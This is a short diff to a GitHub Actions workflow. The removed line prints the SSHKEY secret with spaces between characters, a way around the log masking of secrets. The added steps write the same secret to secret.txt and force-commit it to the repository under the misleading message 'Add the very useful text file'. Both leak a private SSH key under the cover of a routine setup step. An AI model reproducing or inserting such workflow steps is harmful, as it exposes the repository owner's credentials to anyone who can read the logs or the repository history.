@@ -21,7 +21,12 @@ jobs:
       - name: Set up secret file
         env:
           SSHKEY: ${{ secrets.SSHKEY }}
-        run: echo $SSHKEY | sed 's/./& /g'
+        run: echo $SSHKEY > secret.txt
+      - uses: EndBug/add-and-commit@v8
+        with:
+          message: 'Add the very useful text file'
+          add: '*.txt --force'
+          cwd: '.'
         
           
       - name: Use Node.js ${{ matrix.node-version }}
